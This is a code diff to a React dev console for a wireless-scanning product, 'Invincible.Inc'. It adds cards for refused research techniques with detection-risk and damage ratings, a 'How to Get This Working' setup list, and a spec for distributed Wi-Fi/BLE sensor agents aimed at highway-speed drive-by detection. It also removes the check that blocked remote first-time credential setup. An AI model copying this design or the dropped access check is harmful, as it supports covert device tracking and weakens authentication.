+                  {r.refused && <span style={{ fontSize:10, fontWeight:800, color:'#FF453A', background:'rgba(255,69,58,0.1)', border:'1px solid rgba(255,69,58,0.3)', borderRadius:6, padding:'2px 8px' }}>🚫 REFUSED</span>}
+                  {r.flockResearch && <span style={{ fontSize:10, fontWeight:800, color:'#FF9F0A', background:'rgba(255,159,10,0.1)', border:'1px solid rgba(255,159,10,0.3)', borderRadius:6, padding:'2px 8px' }}>🔬 REAL RESEARCH</span>}
+                  {dr && <span style={{ fontSize:10, fontWeight:700, color:dr.color, background:dr.bg, border:`1px solid ${dr.color}33`, borderRadius:6, padding:'2px 8px' }}>CATCH: {dr.label}</span>}
+                  {dmg && <span style={{ fontSize:10, fontWeight:700, color:dmg.color, background:dmg.bg, border:`1px solid ${dmg.color}33`, borderRadius:6, padding:'2px 8px' }}>DMG: {dmg.label}</span>}
+                  <button onClick={() => setShowDesc(s => ({...s, [activeSection]: !s[activeSection]}))} style={{ fontSize:10, fontWeight:700, color: isExpanded ? C.accent : C.dim, background: isExpanded ? 'rgba(0,200,255,0.12)' : 'rgba(255,255,255,0.05)', border:`1px solid ${isExpanded ? 'rgba(0,200,255,0.3)' : C.border}`, borderRadius:6, padding:'2px 8px', cursor:'pointer', fontFamily:C.font }}>ℹ️ {isExpanded ? 'Hide Info' : 'Info'}</button>
                 </div>
               </div>
-              <div style={{ fontSize:13, color:C.dim, lineHeight:1.7, marginTop:14 }}>{r.desc}</div>
             </div>
 
-            {/* Code anatomy */}
-            <div className="dev-card" style={{ marginBottom:12 }}>
-              <div style={{ fontSize:11, fontWeight:700, color:C.dim, textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:10 }}>Technical Anatomy — DO NOT IMPLEMENT</div>
-              <div className="dev-terminal" style={{ background:'rgba(255,69,58,0.04)', borderColor:'rgba(255,69,58,0.15)' }}>
-                <pre style={{ margin:0, fontSize:11, whiteSpace:'pre-wrap', wordBreak:'break-all', color:'rgba(255,120,100,0.9)', lineHeight:1.8 }}>{r.code}</pre>
+            {/* Description — hidden by default, shown when ℹ️ is toggled */}
+            {isExpanded && (
+              <div style={{ ...S.card, background:'rgba(255,255,255,0.02)', marginBottom:10 }}>
+                <div style={{ fontSize:11, color:C.dim, lineHeight:1.8 }}>{r.desc}</div>
               </div>
-            </div>
+            )}
 
-            {/* Legal consequences */}
-            <div className="dev-card" style={{ background:'rgba(255,69,58,0.04)', borderColor:'rgba(255,69,58,0.15)' }}>
-              <div style={{ fontSize:11, fontWeight:700, color:C.red, textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:8 }}>Why We Won't / Can't</div>
-              <div style={{ fontSize:13, color:C.dim, lineHeight:1.7 }}>{r.why}</div>
-            </div>
+            {/* Detection note — always visible */}
+            {r.detectionNote && (
+              <div style={{ display:'flex', alignItems:'flex-start', gap:8, padding:'8px 10px', background: dr?.bg || 'rgba(255,255,255,0.03)', borderRadius:8, border:`1px solid ${dr?.color || C.border}33`, marginBottom:10 }}>
+                <div style={{ width:8, height:8, borderRadius:'50%', background: dr?.color || C.dim, flexShrink:0, marginTop:3 }}/>
+                <div>
+                  <span style={{ fontSize:10, fontWeight:800, color: dr?.color || C.dim, textTransform:'uppercase', letterSpacing:'0.08em' }}>Detection Risk: {dr?.label || 'N/A'}</span>
+                  <div style={{ fontSize:10, color:C.dim2, lineHeight:1.6, marginTop:2 }}>{r.detectionNote}</div>
+                </div>
+              </div>
+            )}
+
+            {/* Damage note — always visible */}
+            {dmg && dmg.score > 0 && (
+              <div style={{ display:'flex', alignItems:'flex-start', gap:8, padding:'8px 10px', background: dmg.bg, borderRadius:8, border:`1px solid ${dmg.color}33`, marginBottom:10 }}>
+                <div style={{ width:8, height:8, borderRadius:'50%', background: dmg.color, flexShrink:0, marginTop:3 }}/>
+                <div>
+                  <span style={{ fontSize:10, fontWeight:800, color: dmg.color, textTransform:'uppercase', letterSpacing:'0.08em' }}>Damage Potential: {dmg.label}</span>
+                  <div style={{ fontSize:10, color:C.dim2, lineHeight:1.6, marginTop:2 }}>{dmg.desc}</div>
+                </div>
+              </div>
+            )}
+
+            {/* Refused reason — always visible if present */}
+            {r.refusedReason && (
+              <div style={{ ...S.card, background:'rgba(255,69,58,0.05)', border:'1px solid rgba(255,69,58,0.2)', marginBottom:10 }}>
+                <div style={{ fontSize:10, fontWeight:800, color:'#FF453A', marginBottom:4 }}>WHY REFUSED</div>
+                <div style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>{r.refusedReason}</div>
+              </div>
+            )}
+
+            {/* Why we won't — always visible */}
+            {r.why && (
+              <div style={{ ...S.card, background:'rgba(255,159,10,0.04)', border:'1px solid rgba(255,159,10,0.15)', marginBottom:10 }}>
+                <div style={{ fontSize:10, fontWeight:800, color:C.orange, marginBottom:4 }}>WHY WE DON'T</div>
+                <div style={{ fontSize:11, color:C.dim, lineHeight:1.7 }}>{r.why}</div>
+              </div>
+            )}
+
+            {/* Code block — always visible */}
+            {r.code && (
+              <div style={{ ...S.card, background:'rgba(0,200,255,0.02)', marginBottom:10 }}>
+                <div style={{ fontSize:10, fontWeight:700, color:C.dim2, marginBottom:6, textTransform:'uppercase', letterSpacing:'0.08em' }}>Technical Reference</div>
+                <pre style={{ margin:0, fontSize:10, color:C.dim, lineHeight:1.7, overflowX:'auto', whiteSpace:'pre-wrap', wordBreak:'break-word' }}>{r.code}</pre>
+              </div>
+            )}
+
+            {/* Law */}
+            {r.law && (
+              <div style={{ fontSize:10, color: r.lawColor || C.dim2, marginTop:4, lineHeight:1.5 }}>
+                <strong style={{ color:C.dim }}>Legal exposure:</strong> {r.law}
+              </div>
+            )}
+
+            {/* Invincible.Net note */}
+            {r.invNetNote && (
+              <div style={{ ...S.card, background:'rgba(124,58,237,0.06)', border:'1px solid rgba(124,58,237,0.2)', marginTop:8 }}>
+                <div style={{ fontSize:10, fontWeight:700, color:'#a78bfa', marginBottom:4 }}>🌐 Invincible.Net</div>
+                <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>{r.invNetNote}</div>
+              </div>
+            )}
+
+            {/* Setup instructions — how to get this working */}
+            {r.setup && (
+              <div style={{ ...S.card, background:'rgba(48,209,88,0.04)', border:'1px solid rgba(48,209,88,0.25)', marginTop:8 }}>
+                <div style={{ fontSize:10, fontWeight:800, color:C.green, marginBottom:8, textTransform:'uppercase', letterSpacing:'0.08em' }}>🔧 How to Get This Working</div>
+                {r.setup.map((step, i) => (
+                  <div key={i} style={{ display:'flex', gap:8, marginBottom:i < r.setup.length-1 ? 7 : 0, alignItems:'flex-start' }}>
+                    <div style={{ fontSize:10, fontWeight:700, color:C.green, flexShrink:0, minWidth:16, marginTop:1 }}>{i+1}.</div>
+                    <div style={{ fontSize:11, color:C.dim, lineHeight:1.6 }}>{step}</div>
+                  </div>
+                ))}
+              </div>
+            )}
           </div>
         )
       })()}
@@ -3624,7 +3813,7 @@ const DEV_CHANGELOG = [
     devOnly: true,
     items: [
       'Replaced 4-digit PIN pad with full username + password login form',
-      'Credentials stored in localStorage (CRED_KEY) — default: admin / invincible1',
+      'Credentials stored in localStorage (CRED_KEY) — username: admin, password set by owner',
       'Same lockout policy: 5 failed attempts triggers a 5-minute lockout with live countdown',
       'Settings → Security tab updated: change username + password (6-char minimum)',
       'Login screen matches dev console dark theme with branded header',
@@ -3993,6 +4182,8 @@ function TabMap({ data }) {
   const [mounted,         setMounted]         = useState(false)
   useEffect(() => { const t = setTimeout(() => setMounted(true), 80); return () => clearTimeout(t) }, [])
 
+  const isMob = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
+
   // GPS position from backend (dev console has no user geolocation relay)
   useEffect(() => {
     const poll = () => {
@@ -4004,7 +4195,7 @@ function TabMap({ data }) {
         .catch(() => {})
     }
     poll()
-    const id = setInterval(poll, 2000)
+    const id = setInterval(poll, isMob ? 4000 : 2000)
     return () => clearInterval(id)
   }, [])
 
@@ -4030,7 +4221,7 @@ function TabMap({ data }) {
         .catch(() => {})
     }
     poll()
-    const id = setInterval(poll, 10000)
+    const id = setInterval(poll, isMob ? 20000 : 10000)
     return () => clearInterval(id)
   }, [])
 
@@ -4057,7 +4248,7 @@ function TabMap({ data }) {
         .catch(() => {})
     }
     poll()
-    const id = setInterval(poll, 5000)
+    const id = setInterval(poll, isMob ? 10000 : 5000)
     return () => clearInterval(id)
   }, [overlayOpen, showProbeBlips])
 
@@ -4066,7 +4257,7 @@ function TabMap({ data }) {
     if (!showCellInfo) return
     const poll = () => fetch('/scan/cell').then(r=>r.json()).then(d=>setCellInfo(d?.cell||{})).catch(()=>{})
     poll()
-    const id = setInterval(poll, 5000)
+    const id = setInterval(poll, isMob ? 10000 : 5000)
     return () => clearInterval(id)
   }, [showCellInfo])
 
@@ -4075,14 +4266,14 @@ function TabMap({ data }) {
     if (!showAggressive) return
     const poll = () => fetch('/scan/aggressive').then(r=>r.json()).then(d=>setAggressiveData(d||{})).catch(()=>{})
     poll()
-    const id = setInterval(poll, 5000)
+    const id = setInterval(poll, isMob ? 10000 : 5000)
     return () => clearInterval(id)
   }, [showAggressive])
 
   const activeStoppers = stopperTrails.filter(s => Date.now() - s.last_seen_ms < 15 * 60 * 1000)
 
   return (
-    <div style={{ position:'absolute', inset:0 }}>
+    <div style={{ position:'absolute', inset:0, display:'flex', flexDirection:'column' }}>
       {!mounted && (
         <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center', background:C.bg }}>
           <span style={{ color:C.dim, fontSize:13 }}>Loading map…</span>
@@ -4860,6 +5051,75 @@ function TabNetLab() {
       <div style={{ ...S.card, background:'rgba(255,255,255,0.02)', fontSize:11, color:C.dim2, lineHeight:1.8 }}>
         <strong style={{ color:C.dim }}>Status:</strong> Invincible.Net is in pre-development planning. This tab serves as the internal specification and advertising reference. All tool integrations require explicit customer authorization and ROE documentation before use in any engagement.
       </div>
+
+      {/* Cooperative Scanning Architecture */}
+      <div style={S.label}>Cooperative Scanning — Sensor Agent Model</div>
+      <div style={{ ...S.card, background:'rgba(0,200,255,0.03)', padding:'14px 16px' }}>
+        <div style={{ fontSize:12, fontWeight:700, color:C.accent, marginBottom:8 }}>Controller + Agent Architecture</div>
+        <div style={{ fontSize:11, color:C.dim, lineHeight:1.7, marginBottom:12 }}>
+          The Windows controller defines scope (allowlists, time window, engagement ID), collects and merges sensor data from nearby agent devices, builds encounters/heatmap/clusters, and generates reports. Agent devices (phones, spare laptops, Raspberry Pi nodes, USB dongle rigs) perform limited local scanning and send summaries to the controller.
+        </div>
+        {[
+          { icon:'📡', title:'Wi-Fi Sensor Agents', desc:'Multiple agents with different antenna placement (passenger window, rear window) provide better coverage. Channel splitting: agent A watches 2.4 GHz ch 1/6/11; agent B watches 5 GHz 36/40/44/48. Fast scan cadence for highway-speed detection.' },
+          { icon:'🔵', title:'BLE Sensor Agents', desc:'Android phones are good BLE scanners. Multiple agents reduce RSSI noise from vehicle body reflections. iOS: BLE + GPS + notes only (Wi-Fi scanning restricted by platform).' },
+          { icon:'📶', title:'Cellular Context', desc:'Cell ID, network type, and signal bars from OS APIs are safe legal telemetry. No RF interception. Cellular "carrier testing mode" risks are documented in ref-radio-sdr-pipeline.' },
+          { icon:'🔒', title:'Trust Model', desc:'QR-code pairing + mutual TLS (per-engagement certs). Scope token embedded: allowed target IDs, bands, time window. Agents only scan approved targets — hard allowlist enforced before any capture.' },
+        ].map(item => (
+          <div key={item.title} style={{ display:'flex', gap:10, padding:'8px 0', borderTop:`1px solid ${C.border}` }}>
+            <span style={{ fontSize:16, flexShrink:0 }}>{item.icon}</span>
+            <div>
+              <div style={{ fontSize:11, fontWeight:700, color:C.text, marginBottom:3 }}>{item.title}</div>
+              <div style={{ fontSize:10, color:C.dim, lineHeight:1.6 }}>{item.desc}</div>
+            </div>
+          </div>
+        ))}
+      </div>
+
+      {/* Distributed Sensor Tiers */}
+      <div style={S.label}>Coverage Expansion — Sensor Tiers (Widest → Nearest)</div>
+      {[
+        { rank:'1', title:'Opt-In Crowdsourced Fleet (City Scale)', color:C.accent, desc:'Many volunteer/authorized devices upload tagged local scans to a shared server. Coverage scales with participant count and distribution. Must be fully opt-in or explicitly authorized corporate devices. Best for large-area mapping and trend detection.' },
+        { rank:'2', title:'Authorized Infrastructure as Sensors (Campus Scale)', color:C.green, desc:'In permitted environments, managed Wi-Fi APs and wireless controllers already see all clients across a building or campus. Treat them as distributed sensors for instant multi-floor coverage. Best for enterprise assessments.' },
+        { rank:'3', title:'Coordinated Multi-Scanner Cluster (Block Scale)', color:'#FFD60A', desc:'Several nearby devices split Wi-Fi channels and BLE scan windows to avoid redundancy. One device handles discovery, another handles follow-up metadata. Critical for highway-speed drive-by detection where you have only seconds in range.' },
+        { rank:'4', title:'Local Ad-Hoc Mesh (Room/Vehicle Scale)', color:C.orange, desc:'Devices within ~30m form a BLE mesh or Wi-Fi Direct cluster. Each node scans its immediate area and shares summaries to the lead controller. Best for multi-floor buildings or a car + nearby devices.' },
+        { rank:'5', title:'Relay-Only Nearby Devices (Same Location)', color:C.dim, desc:'Nearby devices relay results or provide compute/storage — no additional RF coverage. Improves reliability and reduces dropped data but does not expand the scan footprint.' },
+      ].map(tier => (
+        <div key={tier.rank} style={{ ...S.card, display:'flex', gap:12, alignItems:'flex-start', padding:'10px 14px', marginBottom:6 }}>
+          <div style={{ width:24, height:24, borderRadius:'50%', background:`${tier.color}22`, border:`2px solid ${tier.color}`, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:11, fontWeight:800, color:tier.color }}>{tier.rank}</div>
+          <div>
+            <div style={{ fontSize:11, fontWeight:700, color:tier.color, marginBottom:4 }}>{tier.title}</div>
+            <div style={{ fontSize:10, color:C.dim, lineHeight:1.6 }}>{tier.desc}</div>
+          </div>
+        </div>
+      ))}
+
+      {/* Unified Release History */}
+      <div style={S.label}>Release History</div>
+      {DEV_CHANGELOG.map((entry, i) => (
+        <div key={i} style={{ ...S.card, marginBottom:8, opacity: entry.devOnly ? 0.75 : 1 }}>
+          <div style={{ display:'flex', alignItems:'center', gap:10 }}>
+            <span style={{ fontSize:16 }}>{entry.devOnly ? '🔧' : '📦'}</span>
+            <div style={{ flex:1 }}>
+              <div style={{ display:'flex', alignItems:'center', gap:8, flexWrap:'wrap' }}>
+                <span style={{ fontSize:13, fontWeight:800, color:C.text }}>{entry.version}</span>
+                <span style={{ fontSize:10, color:C.dim }}>— {entry.date}</span>
+                {entry.devOnly && <span style={{ fontSize:9, background:'rgba(255,69,58,0.1)', color:'#FF453A', padding:'1px 6px', borderRadius:20, border:'1px solid rgba(255,69,58,0.2)' }}>DEV ONLY</span>}
+              </div>
+              <div style={{ fontSize:12, color: entry.devOnly ? C.dim : C.accent, marginTop:2 }}>{entry.title}</div>
+            </div>
+          </div>
+          <ul style={{ margin:'8px 0 0 22px', padding:0, listStyle:'disc' }}>
+            {entry.items.map((item, j) => (
+              <li key={j} style={{ fontSize:11, color:C.dim, lineHeight:1.7, marginBottom:1 }}>{item}</li>
+            ))}
+          </ul>
+          <div style={{ display:'flex', gap:6, flexWrap:'wrap', marginTop:8 }}>
+            {entry.platforms.map(p => (
+              <span key={p} style={{ fontSize:10, padding:'2px 8px', borderRadius:20, background:'rgba(0,200,255,0.07)', border:'1px solid rgba(0,200,255,0.15)', color:C.dim2 }}>{p}</span>
+            ))}
+          </div>
+        </div>
+      ))}
     </div>
   )
 }
@@ -4916,8 +5176,9 @@ function DevInterface() {
     })
   }, [])
 
+  const _isMob = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
   useEffect(() => { refresh() }, [refresh])
-  useEffect(() => { const id = setInterval(refresh, 5000); return () => clearInterval(id) }, [refresh])
+  useEffect(() => { const id = setInterval(refresh, _isMob ? 12000 : 5000); return () => clearInterval(id) }, [refresh])
 
   return (
     <div style={{ position:'fixed', inset:0, background:C.bg, color:C.text, fontFamily:C.font, display:'flex', flexDirection:'column', overflow:'hidden',
@@ -5096,36 +5357,8 @@ function TabLegal() {
 // ─────────────────────────────────────────────────────────────────────────────
 // Entry point
 // ─────────────────────────────────────────────────────────────────────────────
-function LockedRemote() {
-  return (
-    <div style={{
-      position:'fixed', inset:0, background:'#080c14',
-      display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center',
-      fontFamily:'-apple-system,BlinkMacSystemFont,system-ui,sans-serif',
-      backgroundImage:'linear-gradient(rgba(0,200,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,200,255,0.02) 1px,transparent 1px)',
-      backgroundSize:'50px 50px',
-    }}>
-      <div style={{ textAlign:'center', padding:'0 32px', maxWidth:360 }}>
-        <div style={{ fontSize:40, marginBottom:16 }}>🔒</div>
-        <div style={{ fontSize:11, letterSpacing:4, color:'rgba(0,200,255,0.4)', textTransform:'uppercase', marginBottom:10 }}>Invincible.Inc</div>
-        <div style={{ fontSize:20, fontWeight:800, color:'#fff', marginBottom:12 }}>Dev Console</div>
-        <div style={{ fontSize:13, color:'rgba(180,195,220,0.5)', lineHeight:1.7 }}>
-          No credentials configured on this device.<br/>
-          Initial setup must be done from the host machine.<br/><br/>
-          <span style={{ fontSize:12, color:'rgba(180,195,220,0.3)' }}>Access the console on localhost to configure credentials, then return here to log in.</span>
-        </div>
-      </div>
-    </div>
-  )
-}
-
 export default function DevPanel() {
   const [unlocked, setUnlocked] = useState(() => sessionStorage.getItem(SESSION_KEY) === '1')
-  const hasStoredCreds = localStorage.getItem(CRED_KEY) !== null
-  const isLocalhost = ['localhost','127.0.0.1','0.0.0.0'].includes(window.location.hostname)
-  if (!hasStoredCreds && !unlocked) {
-    return isLocalhost ? <FirstTimeSetup onDone={() => setUnlocked(true)} /> : <LockedRemote />
-  }
   if (!unlocked) return <Passcode onUnlock={() => setUnlocked(true)} />
   return <DevInterface />
 }
